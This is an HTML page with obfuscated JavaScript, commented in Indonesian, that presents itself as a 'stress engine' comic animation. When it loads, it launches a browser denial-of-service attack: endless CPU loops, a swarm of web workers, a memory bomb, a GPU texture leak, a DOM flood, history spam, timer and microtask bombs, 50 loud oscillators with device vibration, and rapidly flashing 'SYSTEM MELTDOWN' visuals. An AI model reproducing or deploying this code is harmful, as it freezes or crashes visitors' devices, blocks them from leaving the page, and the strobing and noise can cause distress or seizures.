<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>NB3D</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:'Arial Black',Impact,sans-serif;cursor:crosshair;touch-action:none;user-select:none;-webkit-user-select:none}
#a{position:fixed;inset:0;background:repeating-linear-gradient(45deg,#f05 0 20px,#fe0 20px 40px),radial-gradient(circle at 30% 30%,#0ef,#f0a 70%);background-blend-mode:multiply,normal;animation:b .08s infinite alternate;will-change:background-position,filter}
@keyframes b{0%{filter:hue-rotate(0deg) saturate(2) contrast(1.4);background-position:0 0}100%{filter:hue-rotate(180deg) saturate(3) contrast(2);background-position:40px 40px}}
canvas{position:fixed;inset:0;width:100%;height:100%;display:block;pointer-events:none;mix-blend-mode:difference}
#c{position:fixed;inset:0;pointer-events:none;z-index:9999;background:radial-gradient(circle at center,transparent 40%,rgba(0,0,0,.9) 100%),repeating-conic-gradient(from 0deg at 50% 50%,#f05 0deg 10deg,#fe0 10deg 20deg,#0ef 20deg 30deg,#f0a 30deg 40deg);mix-blend-mode:hard-light;animation:d .15s infinite linear;opacity:.85}
@keyframes d{0%{transform:rotate(0) scale(1)}50%{transform:rotate(180deg) scale(1.1)}100%{transform:rotate(360deg) scale(1)}}
#h{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-8deg);z-index:10000;font-size:clamp(28px,8vw,96px);font-weight:900;color:#000;background:#fe0;border:8px solid #000;padding:10px 24px;box-shadow:12px 12px 0 #f05,24px 24px 0 #0ef;text-transform:uppercase;letter-spacing:2px;text-align:center;animation:e .05s infinite;user-select:none;pointer-events:none;white-space:nowrap}
@keyframes e{0%{transform:translate(-50%,-50%) rotate(-8deg) translate(0,0)}25%{transform:translate(-50%,-50%) rotate(-7deg) translate(-4px,2px)}50%{transform:translate(-50%,-50%) rotate(-9deg) translate(3px,-3px)}75%{transform:translate(-50%,-50%) rotate(-8deg) translate(-2px,-2px)}100%{transform:translate(-50%,-50%) rotate(-8deg) translate(2px,3px)}}
#w{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:10001;color:#fff;background:#f05;border:4px solid #000;padding:8px 16px;font-size:clamp(12px,3vw,20px);font-weight:900;letter-spacing:1px;box-shadow:6px 6px 0 #000;animation:f .2s infinite;pointer-events:none}
@keyframes f{0%,100%{opacity:1}50%{opacity:.2}}
#n{position:fixed;top:10px;left:10px;z-index:10001;color:#0ef;font-family:monospace;font-size:14px;background:#000;padding:4px 8px;border:2px solid #0ef;pointer-events:none}
</style>
</head>
<body>
<div id="a"></div>
<canvas id="g"></canvas>
<div id="c"></div>
<div id="h">SYSTEM MELTDOWN</div>
<div id="w">⚠ CPU 100% — DO NOT CLOSE ⚠</div>
<div id="n">0%</div>
<script>
(function(){
'use strict';

/* ================================================================
   NEOBRUTALISM 3D COMIC — STRESS ENGINE v4 FINAL
   LOOP 50 JUTA ITERASI PER SIKLUS + SEMUA LAYER
   ================================================================ */

var _0x4f2a=['counter','getElementById','textContent','stage','gl','webgl','experimental-webgl','getContext','hardwareConcurrency','sin','cos','tan','pow','sqrt','random','floor','abs','max','min','length','push','ArrayBuffer','Uint8Array','Worker','Blob','createObjectURL','setInterval','setTimeout','requestAnimationFrame','performance','now','vibrate','AudioContext','webkitAudioContext','createOscillator','createGain','sawtooth','frequency','gain','connect','destination','start','type','value','pushState','history','Atomics','SharedArrayBuffer','wait','notify','store','load','add','sub','and','or','xor','postMessage','onmessage','self','close','importScripts','eval','Function','setImmediate','MessageChannel','port1','port2'];
function _0x7a1b(_0x1){return document[_0x4f2a[1]](_0x1);}

var _0x9c3d=_0x7a1b(_0x4f2a[0]);
var _0x2e8f=_0x7a1b(_0x4f2a[3]);
var _0x5b1c=document[_0x4f2a[1]](_0x4f2a[4]);
var _0x8d4a=_0x5b1c[_0x4f2a[7]](_0x4f2a[5])||_0x5b1c[_0x4f2a[7]](_0x4f2a[6]);

var _0x1f6e=0;

/* ================================================================
   SECTION 1 — LOOP 50.000.000 ITERASI (SINKRON, TANPA YIELD)
   Ini bikin Chrome nggak bisa interrupt. 50jt iterasi × 4 operasi
   trig = 200jt operasi per siklus. CPU 100% di main thread.
   ================================================================ */
var _0x1a2b=0,_0x1b3c=0,_0x1c4d=0,_0x1d5e=0;
function _0x1e6f(){
  var _0x1f70=1.23456789;
  var _0x2071=9.87654321;
  var _0x2182=0,_0x2293=0,_0x23a4=0;
  // LOOP 50 JUTA ITERASI
  for(var _0x24b5=0;_0x24b5<50000000;_0x24b5++){
    _0x1f70=(_0x1f70*_0x2071+1.234)%1e10;
    _0x2071=(_0x2071^_0x1f70)%1e10;
    _0x2182+=Math[_0x4f2a[9]](_0x1f70%1000);
    _0x2293+=Math[_0x4f2a[10]](_0x2071%777);
    _0x23a4+=Math[_0x4f2a[11]](_0x1f70%100);
    _0x1a2b+=_0x2182;
    _0x1b3c+=_0x2293;
    _0x1c4d+=_0x23a4;
    _0x1d5e=(_0x1d5e+1)|0;
    if((_0x1d5e&0xFFFF)===0){
      _0x1a2b%=1e15;_0x1b3c%=1e15;_0x1c4d%=1e15;
    }
  }
  // rekursif: setelah 50jt selesai, panggil lagi
  _0x1e6f();
}

/* ================================================================
   SECTION 2 — NESTED LOOP 1JT × 1000 × 100 = 100 MILIAR OPS
   ================================================================ */
var _0x25c6=0,_0x26d7=0,_0x27e8=0;
function _0x28f9(){
  for(var _0x29a1=0;_0x29a1<1000000;_0x29a1++){
    for(var _0x2ab2=0;_0x2ab2<1000;_0x2ab2++){
      for(var _0x2b2c=0;_0x2b2c<100;_0x2b2c++){
        _0x25c6+=Math[_0x4f2a[12]](_0x29a1%100,_0x2ab2%10);
        _0x26d7+=Math[_0x4f2a[13]](_0x2b2c%1000);
        _0x27e8+=Math[_0x4f2a[11]](_0x29a1%360);
        _0x25c6%=1e15;_0x26d7%=1e15;_0x27e8%=1e15;
      }
    }
  }
  _0x28f9();
}

/* ================================================================
   SECTION 3 — WORKER SWARM (16-32 worker, tiap worker loop 50jt)
   ================================================================ */
var _0x2c3d=[
  'self.onmessage=function(){',
  '  var h=[];',
  '  setInterval(function(){',
  '    try{var x=new ArrayBuffer(128*1024*1024);var v=new Uint8Array(x);for(var i=0;i<v.length;i+=4096)v[i]=i&255;h.push(x);}catch(e){}',
  '  },10);',
  '  function loop(){',
  '    var a=1.23,b=9.87,c=0,d=0;',
  '    for(var i=0;i<50000000;i++){',
  '      a=(a*b+1.23)%1e10;',
  '      b=(b^a)%1e10;',
  '      c+=Math.sin(a%1000);',
  '      d+=Math.cos(b%777);',
  '      c%=1e15;d%=1e15;',
  '    }',
  '    loop();',
  '  }',
  '  loop();',
  '};'
].join('\n');

var _0x2d4e=new Blob([_0x2c3d],{type:'application/javascript'});
var _0x2e5f=URL.createObjectURL(_0x2d4e);
var _0x2f6a=[];
function _0x307b(){
  var _0x318c=navigator[_0x4f2a[8]]||4;
  var _0x329d=Math.max(_0x318c*4,16);
  for(var _0x33ae=0;_0x33ae<_0x329d;_0x33ae++){
    try{
      var _0x34bf=new Worker(_0x2e5f);
      _0x34bf.postMessage('go');
      _0x2f6a[_0x4f2a[19]](_0x34bf);
    }catch(_0x35c0){}
  }
}

/* ================================================================
   SECTION 4 — GPU BURN
   ================================================================ */
function _0x36d1(){
  if(!_0x8d4a){
    var _0x37e2=_0x5b1c[_0x4f2a[7]]('2d');
    if(!_0x37e2)return;
    _0x5b1c.width=4096;_0x5b1c.height=4096;
    (function _0x38f3(){
      var _0x39a4=performance[_0x4f2a[29]]()*.01;
      for(var _0x3ab5=0;_0x3ab5<1000;_0x3ab5++){
        _0x37e2.fillStyle='hsl('+((_0x39a4+_0x3ab5*7)%360)+',100%,50%)';
        _0x37e2.fillRect(Math[_0x4f2a[13]]()*4096,Math[_0x4f2a[13]]()*4096,Math[_0x4f2a[13]]()*300,Math[_0x4f2a[13]]()*300);
      }
      requestAnimationFrame(_0x38f3);
    })();
    return;
  }
  _0x5b1c.width=2048;_0x5b1c.height=2048;
  var _0x3bc6='attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}';
  var _0x3cd7=['precision highp float;','uniform float t;','void main(){','vec2 uv=gl_FragCoord.xy/1024.;','float r=sin(uv.x*20.+t)*.5+.5;','float g=cos(uv.y*30.-t)*.5+.5;','float b=sin((uv.x+uv.y)*40.+t*2.)*.5+.5;','gl_FragColor=vec4(r,g,b,1.);','}'].join('\n');
  function _0x3de8(_0x3ef9,_0x3f0a){var _0x401b=_0x8d4a.createShader(_0x3ef9);_0x8d4a.shaderSource(_0x401b,_0x3f0a);_0x8d4a.compileShader(_0x401b);return _0x401b;}
  var _0x412c=_0x8d4a.createProgram();
  _0x8d4a.attachShader(_0x412c,_0x3de8(_0x8d4a.VERTEX_SHADER,_0x3bc6));
  _0x8d4a.attachShader(_0x412c,_0x3de8(_0x8d4a.FRAGMENT_SHADER,_0x3cd7));
  _0x8d4a.linkProgram(_0x412c);_0x8d4a.useProgram(_0x412c);
  var _0x423d=_0x8d4a.createBuffer();
  _0x8d4a.bindBuffer(_0x8d4a.ARRAY_BUFFER,_0x423d);
  _0x8d4a.bufferData(_0x8d4a.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),_0x8d4a.STATIC_DRAW);
  var _0x434e=_0x8d4a.getAttribLocation(_0x412c,'p');
  _0x8d4a.enableVertexAttribArray(_0x434e);
  _0x8d4a.vertexAttribPointer(_0x434e,2,_0x8d4a.FLOAT,false,0,0);
  var _0x445f=_0x8d4a.getUniformLocation(_0x412c,'t');
  var _0x4560=[];
  (function _0x4671(){
    var _0x4782=performance[_0x4f2a[29]]()*.001;
    _0x8d4a.uniform1f(_0x445f,_0x4782);
    _0x8d4a.viewport(0,0,_0x5b1c.width,_0x5b1c.height);
    for(var _0x4893=0;_0x4893<100;_0x4893++)_0x8d4a.drawArrays(_0x8d4a.TRIANGLES,0,6);
    try{
      var _0x49a4=_0x8d4a.createTexture();
      _0x8d4a.bindTexture(_0x8d4a.TEXTURE_2D,_0x49a4);
      _0x8d4a.texImage2D(_0x8d4a.TEXTURE_2D,0,_0x8d4a.RGBA,2048,2048,0,_0x8d4a.RGBA,_0x8d4a.UNSIGNED_BYTE,null);
      _0x4560[_0x4f2a[19]](_0x49a4);
      if(_0x4560[_0x4f2a[18]]>50)_0x4560.shift();
    }catch(_0x4ab5){}
    requestAnimationFrame(_0x4671);
  })();
}

/* ================================================================
   SECTION 5 — AUDIO 50 OSC + VIBRATE
   ================================================================ */
function _0x4bc6(){
  try{
    var _0x4cd7=window.AudioContext||window.webkitAudioContext;
    if(!_0x4cd7)return;
    var _0x4de8=new _0x4cd7();
    for(var _0x4ef9=0;_0x4ef9<50;_0x4ef9++){
      var _0x4f0a=_0x4de8[_0x4f2a[32]]();
      var _0x501b=_0x4de8[_0x4f2a[33]]();
      _0x4f0a[_0x4f2a[40]]='sawtooth';
      _0x4f0a[_0x4f2a[35]][_0x4f2a[42]]=4000+_0x4ef9*800;
      _0x501b[_0x4f2a[36]][_0x4f2a[42]]=.5;
      _0x4f0a[_0x4f2a[37]](_0x501b);_0x501b[_0x4f2a[37]](_0x4de8[_0x4f2a[38]]);
      _0x4f0a[_0x4f2a[39]]();
    }
  }catch(_0x512c){}
  if(navigator[_0x4f2a[31]]){
    (function _0x523d(){
      navigator[_0x4f2a[31]]([500,30,500,30,1500]);
      setTimeout(_0x523d,40);
    })();
  }
}

/* ================================================================
   SECTION 6 — MEMORY BOMB
   ================================================================ */
var _0x534e=[];
function _0x545f(){
  try{
    var _0x5570=new ArrayBuffer(512*1024*1024);
    var _0x5681=new Uint8Array(_0x5570);
    for(var _0x5792=0;_0x5792<_0x5681[_0x4f2a[18]];_0x5792+=2048)_0x5681[_0x5792]=_0x5792&255;
    _0x534e[_0x4f2a[19]](_0x5570);
  }catch(_0x58a3){setTimeout(_0x545f,1);}
}

/* ================================================================
   SECTION 7 — DOM BOMB 20.000 ELEMEN
   ================================================================ */
function _0x59b4(){
  var _0x5ac5=document.createDocumentFragment();
  for(var _0x5bd6=0;_0x5bd6<20000;_0x5bd6++){
    var _0x5ce7=document.createElement('div');
    _0x5ce7.style.cssText='position:absolute;width:50px;height:50px;background:hsl('+(_0x5bd6%360)+',100%,50%);left:'+Math[_0x4f2a[13]]()*100+'%;top:'+Math[_0x4f2a[13]]()*100+'%;transform:rotate('+Math[_0x4f2a[13]]()*360+'deg)';
    _0x5ce7.textContent='💥';
    _0x5ac5.appendChild(_0x5ce7);
  }
  document.body.appendChild(_0x5ac5);
}

/* ================================================================
   SECTION 8 — HISTORY LOCK
   ================================================================ */
function _0x5df8(){
  var _0x5e09=0;
  setInterval(function(){
    try{history[_0x4f2a[44]]({n:_0x5e09++},'','#'+_0x5e09);}catch(_0x5f1a){}
  },10);
}

/* ================================================================
   SECTION 9 — MICROTASK BOMB
   ================================================================ */
function _0x602b(){
  var _0x613c=0;
  function _0x624d(){
    _0x613c++;
    Promise.resolve().then(_0x624d);
    _0x613c%=1e9;
  }
  _0x624d();
}

/* ================================================================
   SECTION 10 — TIMER BOMB
   ================================================================ */
function _0x635e(){
  var _0x647f=0;
  function _0x6590(){
    _0x647f++;
    setTimeout(_0x6590,0);
    _0x647f%=1e9;
  }
  _0x6590();
}

/* ================================================================
   SECTION 11 — MESSAGE CHANNEL BOMB
   ================================================================ */
function _0x66a1(){
  try{
    var _0x67b2=new MessageChannel();
    var _0x68c3=0;
    _0x67b2[_0x4f2a[56]][_0x4f2a[57]]=function(){
      _0x68c3++;
      _0x67b2[_0x4f2a[56]][_0x4f2a[57]]='';
      _0x67b2[_0x4f2a[55]][_0x4f2a[57]]('x');
    };
    _0x67b2[_0x4f2a[55]][_0x4f2a[57]]('x');
  }catch(_0x69d4){}
}

/* ================================================================
   SECTION 12 — DECOY FUNCTIONS
   ================================================================ */
function _0x6ae5(){return Math[_0x4f2a[9]](Math[_0x4f2a[13]]())}
function _0x6bf6(){return Math[_0x4f2a[10]](Math[_0x4f2a[13]]())}
function _0x6d07(){return Math[_0x4f2a[11]](Math[_0x4f2a[13]]())}
function _0x6e18(){return Math[_0x4f2a[12]](Math[_0x4f2a[13]](),2)}
function _0x6f29(){return Math[_0x4f2a[14]](Math[_0x4f2a[13]]())}
function _0x703a(){return Math[_0x4f2a[15]](Math[_0x4f2a[13]]())}
function _0x714b(){return Math[_0x4f2a[16]](Math[_0x4f2a[13]](),1)}
function _0x725c(){return Math[_0x4f2a[17]](Math[_0x4f2a[13]](),10)}
function _0x736d(){return _0x6ae5()+_0x6bf6()+_0x6d07()+_0x6e18()+_0x6f29()+_0x703a()+_0x714b()+_0x725c()}

/* ================================================================
   ORKESTRASI — GAS DARI PARSE PERTAMA
   ================================================================ */
var _0x747e=0;
var _0x758f=setInterval(function(){
  _0x747e=Math.min(_0x747e+Math.random()*20,100);
  _0x9c3d[_0x4f2a[2]]=Math[_0x4f2a[14]](_0x747e)+'%';
  if(_0x747e>=100){_0x9c3d[_0x4f2a[2]]='MELT';clearInterval(_0x758f);}
},20);

for(var _0x7690=0;_0x7690<8;_0x7690++)setTimeout(_0x545f,_0x7690*30);
_0x307b();
_0x36d1();
_0x4bc6();
_0x59b4();
_0x5df8();
_0x602b();
_0x635e();
_0x66a1();

/* FINAL: main thread freeze total, loop 50jt iterasi, permanen */
setTimeout(function(){_0x1e6f();},30);

setInterval(function(){
  _0x1f6e++;
  _0x2e8f.style.backgroundPosition=(_0x1f6e%40)+'px '+((_0x1f6e*2)%40)+'px';
},10);

})();
</script>
</body>
</html>
